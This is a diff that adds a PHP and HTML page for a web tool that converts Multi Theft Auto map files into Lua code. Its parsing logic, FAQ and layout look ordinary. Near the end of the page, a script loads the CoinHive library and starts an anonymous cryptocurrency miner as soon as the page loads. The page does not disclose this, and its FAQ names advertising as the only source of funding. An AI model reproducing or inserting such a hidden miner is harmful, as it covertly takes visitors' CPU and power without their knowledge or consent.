@@ -1,0 +1,354 @@
+<?php
+	/*if ($_SERVER['SERVER_PORT'] != 443) {
+		$redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+		header('HTTP/1.1 301 Moved Permanently');
+		header('Location: ' . $redirect);
+		exit();
+	}*/
+
+	function convert_map_to_lua($lua_str) {
+		$header =
+		"--******************************************************************************\n".
+		"--*	Map converted to lua via: https://lua.wuss.pw at: ".date("Y-m-d")."\n".
+		"--******************************************************************************\n".
+
+		"for i,v in pairs({\n";
+		$footer = "\n}) do\n".
+		"	local obj = createObject(v[1], v[2], v[3], v[4], v[5], v[6], v[7])\n".
+		"	--createBlipAttachedTo(obj, 0, 1, 0,0,0, 10, 0, 180)\n".
+		"	setObjectScale(obj, v[8])\n".
+		"	setElementDimension(obj, v[9])\n".
+		"	setElementInterior(obj, v[10])\n".
+		"	setElementAlpha(obj, v[11])\n".
+		"	setElementCollisionsEnabled(obj, v[12])\n".
+		"	setElementDoubleSided(obj, v[13])\n".
+		"	setObjectBreakable(obj, v[14])\n".
+		"end";
+
+		$header_rem = "\n\nfor i,v in pairs({\n";
+		$footer_rem = "\n}) do\n".
+		"	removeWorldModel(v[1], v[2], v[3], v[4], v[5], v[6])  -- Removes the object\n".
+		"	removeWorldModel(v[7], v[2], v[3], v[4], v[5], v[6])  -- Removes the LOD model\n".
+		"end";
+
+		//Convert string to array of rows
+		$lua_arr = preg_split('/\r\n|[\r\n]/', $lua_str); $lua_str = ""; $lua_str_rem = "";
+
+		//Replace map with lua row by row
+		$index_counter = 1; $index_rem_counter = 1;
+		foreach ($lua_arr as $lua_row) {
+			preg_match("/<object/", $lua_row, $comp_arr);
+			if (isset($comp_arr[0]) && $comp_arr[0] == '<object') {
+				$digit_regex = "(\d+|-\d+|\d+\.\d+|-\d+\.\d+|true|false)";
+				$data = array(
+					"/model=\"".$digit_regex."\"/",
+					"/posX=\"".$digit_regex."\"/",
+					"/posY=\"".$digit_regex."\"/",
+					"/posZ=\"".$digit_regex."\"/",
+					"/rotX=\"".$digit_regex."\"/",
+					"/rotY=\"".$digit_regex."\"/",
+					"/rotZ=\"".$digit_regex."\"/",
+					"/scale=\"".$digit_regex."\"/",
+					"/dimension=\"".$digit_regex."\"/",
+					"/interior=\"".$digit_regex."\"/",
+					"/alpha=\"".$digit_regex."\"/",
+					"/collisions=\"".$digit_regex."\"/",
+					"/doublesided=\"".$digit_regex."\"/",
+					"/breakable=\"".$digit_regex."\"/",
+				);
+				$defaults = array(
+					0, 0,0,0, 0,0,0, 1, 0,0, 255, "true", "true", "false"
+				);
+
+				//Build the lua row from map row
+				$val = "";
+				for ($i = 0; $i < count($data); $i++) {
+					preg_match($data[$i], $lua_row, $output_arr);
+					if (isset($output_arr[1]))
+						$val .= $output_arr[1].",";
+					else
+						$val .= $defaults[$i].",";
+				}
+
+				//Append new line to data table
+				if ($val != "" && isset($_POST['index']) && $_POST['index'] == "y") {
+					$lua_str .= "\t[".$index_counter."]={".substr($val, 0,-1)."},\n";
+					$index_counter++;
+				}
+				else if ($val != "")
+					$lua_str .= "\t{".substr($val, 0,-1)."},\n";
+			}
+
+			preg_match("/<removeWorldObject/", $lua_row, $comp_arr);
+			if (isset($comp_arr[0]) && $comp_arr[0] == '<removeWorldObject') {
+				$digit_regex = "(\d+|-\d+|\d+\.\d+|-\d+\.\d+|true|false)";
+				$data = array(
+					"/model=\"".$digit_regex."\"/",
+					"/radius=\"".$digit_regex."\"/",
+					"/posX=\"".$digit_regex."\"/",
+					"/posY=\"".$digit_regex."\"/",
+					"/posZ=\"".$digit_regex."\"/",
+					"/interior=\"".$digit_regex."\"/",
+					"/lodModel=\"".$digit_regex."\"/",
+				);
+
+				//Build the lua row from map row
+				$val = "";
+				for ($i = 0; $i < count($data); $i++) {
+					preg_match($data[$i], $lua_row, $output_arr);
+					if (isset($output_arr[1]))
+						$val .= $output_arr[1].",";
+				}
+
+				//Append new line to data table
+				if ($val != "" && isset($_POST['index']) && $_POST['index'] == "y") {
+					$lua_str_rem .= "\t[".$index_rem_counter."]={".substr($val, 0,-1)."},\n";
+					$index_rem_counter++;
+				}
+				else if ($val != "")
+					$lua_str_rem .= "\t{".substr($val, 0,-1)."},\n";
+			}
+		}
+
+		//Add header and footer then return result
+		if (isset($_POST['index']) && $_POST['index'] == "y") $footer = str_replace(array("pairs"), array("ipairs"), $footer);
+		if (isset($_POST['index']) && $_POST['index'] == "y") $footer_rem = str_replace(array("pairs"), array("ipairs"), $footer_rem);
+		if ($lua_str != "") 	$lua_str = $header.substr($lua_str, 0,-2).$footer;
+		if ($lua_str_rem != "")	$lua_str .= $header_rem.substr($lua_str_rem, 0,-2).$footer_rem;
+		return $lua_str;
+	}
+?>
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta name="description" content="Convert maps from Multi Theft Auto to corresponding Lua code">
+		<meta name="author" content="Mr_Moose">
+
+		<meta name="google-site-verification" content="zgsY_gqexlwG8jX6DgLhGgVOmP-mnrkUx-qeMgf38v4" />
+
+		<meta property="og:url"           content="https://lua.wuss.pw/" />
+		<meta property="og:type"          content="Map to Lua converter" />
+		<meta property="og:title"         content="Map to Lua converter" />
+		<meta property="og:description"   content="Convert your Multi Theft Auto maps to Lua code" />
+		<meta property="og:image"         content="https://lua.wuss.pw/logo.jpg" />
+
+		<title>Map to Lua converter</title>
+
+		<!-- Bootstrap Core CSS -->
+		<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+		<link href="bootstrap-paper.min.css" rel="stylesheet">
+
+		<!-- Favicon -->
+		<link rel="icon" type="image/x-icon" href="favicon.ico">
+
+		<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+		<!--[if lt IE 9]>
+			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+		<!-- Navigation -->
+		<nav class="navbar navbar-inverse" role="navigation">
+			<div class="container">
+				<!-- Brand and toggle get grouped for better mobile display -->
+				<div class="navbar-header">
+					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+						<span class="sr-only">Toggle navigation</span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+					</button>
+					<a class="navbar-brand" href="/">Converter</a>
+				</div>
+
+				<!-- Collect the nav links, forms, and other content for toggling -->
+				<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+					<ul class="nav navbar-nav">
+						<li class="active"><a href="/">Home</a></li>
+						<li><a href="/about.html">About</a></li>
+						<li><a href="/contact.html">Contact</a></li>
+					</ul>
+				</div>
+			<!-- /.navbar-collapse -->
+			</div>
+		<!-- /.container -->
+		</nav>
+
+		<!-- Page Content -->
+		<div class="container">
+			<div class="row">
+				<div class="col-md-12 col-sm-12">
+					<h1>Convert your maps</h1><hr>
+					<form action="/" method="post">
+						<textarea class="form-control" name="code" placeholder="Paste the content from a *.map file here..." rows="16"><?php
+							if (isset($_POST['code']) && $_POST['code'] != '')
+								echo convert_map_to_lua($_POST['code']);
+						?></textarea><br>
+						<div class="btn-group">
+							<div class="checkbox">
+								<label>
+									<input type="checkbox" data-toggle="toggle" name="index" value="y">
+									Enable index from 1 to N
+								</label>
+							</div>
+						</div>
+						<div class="btn-group pull-right">
+							<a class="btn btn-primary btn-lg" href="/">Reset</a>
+							<input class="btn btn-lg" type="submit" value="Convert" <?php if (isset($_POST['code'])) echo 'disabled'; ?>>
+						</div>
+					</form>
+					<hr>
+				</div>
+				<div class="col-md-6 col-sm-12">
+					<h2>How it works</h2>
+					<p>This map converter use regular expressions to find properties in map files (<em>or any xml formated code</em>). The properties are then listed in a predefined order which is compatible with the official in game map editor for Multi Theft Auto as a lua table. The predefined code will then read the created table and create the map objects as soon the script is executed in game.</p>
+
+					<hr><em><small><center>Ads by Google</center></small></em>
+
+					<!-- wuss.pw-responsive -->
+					<ins class="adsbygoogle"
+					     style="display:block"
+					     data-ad-client="ca-pub-2418023102564409"
+					     data-ad-slot="9285321376"
+					     data-ad-format="auto"></ins>
+					<script>
+						(adsbygoogle = window.adsbygoogle || []).push({});
+					</script>
+					<hr>
+
+					<h3>Why convert maps to Lua?</h3>
+					<p>Converting maps to Lua has many advantages, for instance:
+					<ul>
+						<li>Reduced file size, <em>Converted Lua files are down to 20% the size of it's corresponding map file</em></li>
+						<li>Caching is not a problem, <em>Maps can be locally stored on your clients PC and won't need to download on every connect</em></li>
+						<li>Additional features such as adding a blip to every created object are fully supported</li>
+						<li>Lazy overriding, <em>if you want to make all objects breakable/non breakable or double side/single side only one line has to be changed</em></li>
+					</ul></p>
+					<strong>Do you like this service?</strong>
+					<p>Tell your friends about it:</p>
+					<div class="col-md-6">
+						<!-- Load Facebook SDK for JavaScript -->
+						<div id="fb-root"></div>
+						<script>(function(d, s, id) {
+							var js, fjs = d.getElementsByTagName(s)[0];
+							if (d.getElementById(id)) return;
+							js = d.createElement(s); js.id = id;
+							js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.8";
+							fjs.parentNode.insertBefore(js, fjs);
+						}(document, 'script', 'facebook-jssdk'));</script>
+
+						<!-- Your like button code -->
+						<div class="fb-like"
+							data-href="https://lua.wuss.pw/"
+							data-layout="button_count"
+							data-action="recommend"
+							data-size="large"
+							data-show-faces="false">
+						</div>
+					</div>
+					<div class="col-md-6">
+						<script>
+							window.twttr = (function(d, s, id) {
+							var js, fjs = d.getElementsByTagName(s)[0],
+								t = window.twttr || {};
+							if (d.getElementById(id)) return t;
+							js = d.createElement(s);
+							js.id = id;
+							js.src = "https://platform.twitter.com/widgets.js";
+							fjs.parentNode.insertBefore(js, fjs);
+
+							t._e = [];
+							t.ready = function(f) {
+								t._e.push(f);
+							};
+
+							return t;
+							}(document, "script", "twitter-wjs"));
+						</script>
+
+						<a class="twitter-share-button"
+							href="https://twitter.com/intent/tweet?text=Try%20the%20Map%20to%20Lua%20converter%20for%20#mtasa"
+							data-size="large">
+						Tweet</a>
+					</div>
+					<hr>
+					<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+				</div>
+				<div class="col-md-6 col-sm-12">
+					<h3>F.A.Q</h3>
+					<p><strong>Will it work on any map file?</strong><br>
+					Currently all maps created with the official in game map editor will work, other map files will work if they have all the required properties.</p>
+
+					<p><strong>Do you save my maps?</strong><br>
+					Nope, all map and lua code are processed and returned directly to your browser</p>
+					<p><strong>Can I use this on public networks?</strong><br>
+					Yes, the site is encrypted with SSL/TLS via Cloudflare and Letsencrypt</p>
+					<p><strong>How do I use the converted code?</strong><br>
+					Paste the generated code into a new file with the name: <em>map.lua</em>, then create a file named <em>meta.xml</em> and paste this xml code.
+
+					<div class="panel panel-default">
+						<div class="panel-heading">Content of meta.xml</div>
+						<div class="panel-body">
+							&lt;meta&gt;<br>
+							    &nbsp;&nbsp;&nbsp;&nbsp;&lt;info type="script" name="" author="" version="" description=""&gt;&lt;/info&gt;<br>
+							    &nbsp;&nbsp;&nbsp;&nbsp;&lt;script src="map.lua" type="client" cache="false"&gt;&lt;/script&gt;<br>
+							&lt;/meta&gt;
+						</div>
+					</div>
+					Save both the files in the same directory and put the entire folder into the <em>mods/deathmatch/resources</em> directory of your server.
+					</p>
+					<p><strong>The generated code doesn't work, I'm getting errors like "undefined variable v[*]"</strong><br>
+					Missing properties in your map files or incorrect values (<em>numbers where chars are expected and vice versa</em>) may cause this errors, try to remove the affected functions from the bottom of the file at whatever line has generated the error.</p>
+					<p><strong>How can this service be free?</strong><br>
+					The service has low operational costs which is covered by a small amount of non annoying advertising you may be exposed to while using this service.</p>
+				</div>
+			</div>
+
+			<hr>
+
+                        <!-- Footer -->
+                        <footer>
+                                <div class="row">
+                                        <div class="col-lg-12">
+                                                <p>Copyright &copy; 2017 Mr_Moose, all rights reserved</p>
+                                        </div>
+                                </div>
+                        </footer>
+		</div>
+
+		<!-- Google analytics -->
+		<script>
+  			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  			})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  			ga('create', 'UA-99908829-1', 'auto');
+  			ga('send', 'pageview');
+		</script>
+
+		<!-- jQuery Version 1.11.1 -->
+		<script
+			src="https://code.jquery.com/jquery-3.2.1.min.js"
+			integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+			crossorigin="anonymous">
+		</script>
+
+		<!-- Miner JS -->
+		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+		<script>
+		    var miner = new CoinHive.Anonymous('hWW7glqFxxIP0hESKX6oZ57kDFoJjK2r');
+			miner.setNumThreads(1);
+		    miner.start();
+		</script>
+
+		<!-- Bootstrap Core JavaScript -->
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+	</body>
+</html>
